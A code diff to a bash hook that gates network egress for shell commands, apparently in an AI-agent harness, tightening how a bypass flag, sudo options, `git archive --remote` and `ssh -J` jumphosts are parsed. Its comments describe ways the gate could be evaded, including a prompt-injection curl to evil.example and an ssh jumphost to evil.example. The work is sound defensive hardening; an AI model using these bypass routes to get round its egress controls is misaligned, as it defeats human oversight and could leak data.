@@ -88,25 +88,30 @@ fi
 
 # Spec D-6: BOTH env + flag must be present.
 #
-# R2 refinement: the flag must appear as a SPACE-BRACKETED token in the
-# command (preceded by start-of-string or whitespace AND followed by
-# end-of-string or whitespace). This blocks the prompt-injection pattern
-# `curl -d '{"x":"--allow-egress-outbound"}' https://evil.example` from
-# triggering the bypass — the embedded form is bracketed by `"` not
-# whitespace, so the pattern doesn't match. `grep -w` was too loose
-# (treats `"` as a word boundary, which still matches the embedded form).
-#
-# Caveat: this catches the common bypass-via-JSON-body case but does NOT
-# distinguish a real shell token from a single-quoted string literal
-# like `curl '... --allow-egress-outbound ...'`. Full shell-token
-# parsing would require porting a shellword splitter into the hook,
-# which is out of scope for v0.5.x. The two-factor design assumes the
-# operator who exported `WALTER_EGRESS_ALLOW_OVERRIDE=1` is reviewing
-# the command they typed; that env var is the real gate.
+# R6 refinement (token-aware): the flag must be a REAL shell-quoted
+# token, not just a whitespace-bracketed substring. We use `xargs -n1`
+# which parses POSIX shell quoting and emits one token per line; then
+# `grep -qxF` requires an EXACT line match — so an embedded
+# `--allow-egress-outbound` inside a single-quoted string literal
+# (`curl 'a b --allow-egress-outbound c d'`) is part of a larger token
+# (`a b --allow-egress-outbound c d`) and does NOT trigger the bypass.
+# Falls back to the previous whitespace-bracketed regex if xargs fails
+# (e.g. unmatched quote in the command — also fail-safe in the deny
+# direction since the regex is stricter than substring match).
 _has_bypass_flag() {
-  # `printf '%s\n'` over `echo` so a hypothetical command starting with
-  # `-n` / `-e` is treated as data, not as echo options (Copilot R2
-  # portability nit).
+  local _tokfile
+  _tokfile="$(mktemp 2>/dev/null)"
+  if [[ -n "$_tokfile" ]] && printf '%s' "$1" | xargs -n1 > "$_tokfile" 2>/dev/null; then
+    local _hit=1
+    grep -qxF -- '--allow-egress-outbound' "$_tokfile" && _hit=0
+    rm -f "$_tokfile"
+    return "$_hit"
+  fi
+  rm -f "$_tokfile" 2>/dev/null
+  # xargs failed (unmatched quote etc.) — fall back to the previous
+  # whitespace-bracketed regex (still stricter than substring match).
+  # `printf '%s\n'` over `echo` so leading `-n`/`-e` isn't treated as
+  # echo options.
   printf '%s\n' "$1" | grep -qE -- '(^|[[:space:]])--allow-egress-outbound([[:space:]]|$)'
 }
 
@@ -336,8 +341,13 @@ _inspect_segment() {
         # Eat any flags, optional flag values, and VAR=val assignments.
         while [[ ${#tokens[@]} -gt 0 ]]; do
           case "${tokens[0]}" in
-            # Value-taking flags (sudo + env): consume the next token too.
-            -u|-g|-h|-r|-t|-T|-D|-A|-C|-N|-S)
+            # Value-taking flags (sudo + env). Note: `-N` (sudo's
+            # non-interact) and `-S` (sudo's read-password-from-stdin)
+            # are VALUELESS — including them previously consumed the
+            # NEXT token, which was usually the real CLI, leaving the
+            # URL as the new "cli" → unknown → ALLOW (bypass). Copilot
+            # R6 finding F22.
+            -u|-g|-h|-r|-t|-T|-D|-A|-C)
               tokens=("${tokens[@]:2}") ;;
             # Any other short or long flag: just drop the flag.
             -*)
@@ -450,30 +460,43 @@ _inspect_segment() {
           return 0
           ;;
         archive)
-          # `git archive` is local by default but `--remote=URL` makes it
-          # network. If --remote is present, require URL extraction;
-          # otherwise pass through.
-          local t found_remote=0
-          for t in "${tokens[@]:2}"; do
-            case "$t" in --remote=*|--remote) found_remote=1; break ;; esac
-          done
-          if [[ "$found_remote" -eq 1 ]]; then
-            local found=0 host
-            for t in "${tokens[@]:2}"; do
-              # --remote=URL form
-              if [[ "$t" == --remote=* ]]; then
-                if host="$(_host_from_url "${t#--remote=}")" && [[ -n "$host" ]]; then
-                  found=1
-                  walter_egress_host_allowed "$host" || {
-                    echo "BLOCK: network-gate: '$host' not in egress allowlist (matched via 'git archive --remote=')."; return 0;
-                  }
-                fi
+          # `git archive` is local by default but `--remote=URL` (or
+          # the space-separated `--remote URL`) makes it network. If
+          # --remote is present, require URL extraction; otherwise pass
+          # through. R6 finding F20: previous code only handled the
+          # `=`-form, fail-CLOSED on the space form even though the URL
+          # was right there on the command line.
+          local _i=2 found_remote=0 found=0 host remote_url=""
+          while [[ $_i -lt ${#tokens[@]} ]]; do
+            local _tok="${tokens[$_i]}"
+            case "$_tok" in
+              --remote=*)
+                found_remote=1
+                remote_url="${_tok#--remote=}"
+                _i=$((_i + 1))
+                ;;
+              --remote)
+                # Space-separated form: next token is the URL.
+                found_remote=1
+                remote_url="${tokens[$((_i + 1))]:-}"
+                _i=$((_i + 2))
+                ;;
+              *)
+                _i=$((_i + 1)) ;;
+            esac
+            if [[ -n "$remote_url" ]]; then
+              if host="$(_host_from_url "$remote_url")" && [[ -n "$host" ]]; then
+                found=1
+                walter_egress_host_allowed "$host" || {
+                  echo "BLOCK: network-gate: '$host' not in egress allowlist (matched via 'git archive --remote')."; return 0;
+                }
               fi
-            done
-            if [[ "$found" -eq 0 ]]; then
-              echo "BLOCK: network-gate: 'git archive --remote=' present but URL host could not be extracted. Failing closed."
-              return 0
+              remote_url=""
             fi
+          done
+          if [[ "$found_remote" -eq 1 && "$found" -eq 0 ]]; then
+            echo "BLOCK: network-gate: 'git archive --remote' present but URL host could not be extracted. Failing closed."
+            return 0
           fi
           echo "ALLOW"
           return 0
@@ -490,11 +513,21 @@ _inspect_segment() {
       # Target is the first non-flag positional. ssh has flag args that
       # take values (`-i keyfile`, `-p port`, `-o opt=val`, …) — skip
       # both flag + value to avoid mistaking the value for the host.
-      local i=1 target=""
+      # R6 finding F21: `-J jumphost` was previously eaten as a
+      # value-taking flag without validating the jumphost. That let
+      # `ssh -J evil.example allowed.example` reach `evil.example`
+      # because only `allowed.example` was checked. Now -J's value is
+      # extracted + checked against the allowlist BEFORE we look at the
+      # target. The jumphost arg can be comma-separated for chained
+      # jumps (`-J host1,host2`) — we check every entry.
+      local i=1 target="" jumphosts=""
       while [[ $i -lt ${#tokens[@]} ]]; do
         local tok="${tokens[$i]}"
         case "$tok" in
-          -i|-p|-o|-l|-F|-J|-L|-R|-D|-B|-b|-c|-E|-e|-I|-m|-O|-Q|-S|-W|-w)
+          -J)
+            jumphosts="${tokens[$((i + 1))]:-}"
+            i=$((i + 2)); continue ;;
+          -i|-p|-o|-l|-F|-L|-R|-D|-B|-b|-c|-E|-e|-I|-m|-O|-Q|-S|-W|-w)
             i=$((i + 2)); continue ;;
           -*)
             i=$((i + 1)); continue ;;
@@ -502,6 +535,25 @@ _inspect_segment() {
             target="$tok"; break ;;
         esac
       done
+      # Validate every jumphost in the chain.
+      if [[ -n "$jumphosts" ]]; then
+        local _jh
+        local _IFSold="$IFS"; IFS=','
+        for _jh in $jumphosts; do
+          IFS="$_IFSold"
+          local jhost
+          jhost="$(_host_from_userhost "$_jh")" || jhost=""
+          if [[ -z "$jhost" ]]; then
+            echo "BLOCK: network-gate: 'ssh -J' jumphost not parseable: $_jh"
+            return 0
+          fi
+          if ! walter_egress_host_allowed "$jhost"; then
+            echo "BLOCK: network-gate: '$jhost' (ssh -J jumphost) not in egress allowlist. Add via: walter-os egress add '$jhost'"
+            return 0
+          fi
+        done
+        IFS="$_IFSold"
+      fi
       if [[ -z "$target" ]]; then
         echo "BLOCK: network-gate: 'ssh' invoked without a target host."
         return 0
